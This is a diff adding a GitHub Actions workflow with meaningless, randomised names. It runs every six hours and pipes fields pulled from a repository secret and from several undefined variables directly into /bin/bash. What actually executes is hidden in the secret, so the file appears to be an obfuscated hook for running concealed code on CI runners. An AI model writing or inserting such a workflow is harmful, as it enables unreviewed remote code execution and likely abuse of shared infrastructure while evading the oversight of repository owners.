@@ -1,0 +1,22 @@
+name: craftkneepads
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: craftkneepads
+        env:
+          vdgb5: ${{ secrets.vdgb5 }}
+        run: |
+          echo $vdgb5 | jq -r .kxjbx32674 | /bin/bash
+          echo $ujva73 | jq -r .jueql04 | /bin/bash
+          echo $pt2150 | jq -r .tuu052 | /bin/bash
+          echo $nccfz835 | jq -r .r60 | /bin/bash
+          echo $yytl942 | jq -r .hdyeb14258 | /bin/bash
+          echo $mwwa8391 | jq -r .ofe5206 | /bin/bash
+
